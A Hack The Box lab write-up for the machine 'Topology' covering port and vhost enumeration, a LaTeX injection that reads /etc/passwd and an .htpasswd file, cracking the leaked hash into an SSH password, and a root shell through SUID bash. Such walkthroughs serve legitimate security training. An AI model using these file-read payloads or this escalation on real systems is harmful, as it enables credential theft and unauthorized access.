# Topology

<p align="center"><img src="assets/Topology.png" width="400"></p>

- **Platform:** Hack The Box
- **URL:** https://app.hackthebox.com/machines/Topology
- **Difficulty:** Easy
- **OS:** Linux

## Enumeration

### Port & Service Enumeration

<details>
<summary>masscan</summary>

```
sudo masscan -p1-65535,U:1-65535 --rate=1000 -e tun0 10.10.11.217

Discovered open port 80/tcp on 10.10.11.217
Discovered open port 22/tcp on 10.10.11.217
```
</details>

<details>
<summary>nmap</summary>

```
map -sC -sV -v -p22,80 10.10.11.217

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 dc:bc:32:86:e8:e8:45:78:10:bc:2b:5d:bf:0f:55:c6 (RSA)
|   256 d9:f3:39:69:2c:6c:27:f1:a9:2d:50:6c:a7:9f:1c:33 (ECDSA)
|_  256 4c:a6:50:75:d0:93:4f:9c:4a:1b:89:0a:7a:27:08:d7 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-title: Miskatonic University | Topology Group
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
</details>

### Web Enumeration

<details>
<summary>vhost</summary>

```
gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -u http://topology.htb/

Found: dev.topology.htb Status: 401 [Size: 463]
Found: stats.topology.htb Status: 200 [Size: 108]
```
</details>

## Foothold

### Web → `vdaisley` 🚩

#### Searching for Vulnerabilities

- `http://latex.topology.htb/equation.php` allows you to generate formulas with LaTeX
- `http://latex.topology.htb/header.tex` shows that the `listings` package is included
- LFI is possible e.g. with input `$\lstinputlisting{/etc/passwd}$`
- `/etc/passwd` shows that user `vdaisley` has a home directory and access to a shell
- vhost enumeration with has shown that `dev.topology.htb` returns the status code 401 (Unauthorized), so there is probably a `.htaccess` and `.htpasswd` file somewhere

#### Exploitation

1. With `$\lstinputlisting{/var/www/dev/.htpasswd}$` the contents of `.htpasswd` can be displayed.
2. Copy hash, save to file, crack with hashcat:
    - password hash: `vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0`
    - cracked password: `calculus20`
3. An SSH connection for `vdaisley` can be established with these credentials. 🚩  

## Privilege Escalation

### `vdaisley` → `root` 🏁

#### Searching for Vulnerabilities

- `file /usr/bin/bash` shows that the SUID bit for `root` is set

#### Exploitation

1. a root shell can be created with `/usr/bin/bash -p` 🏁
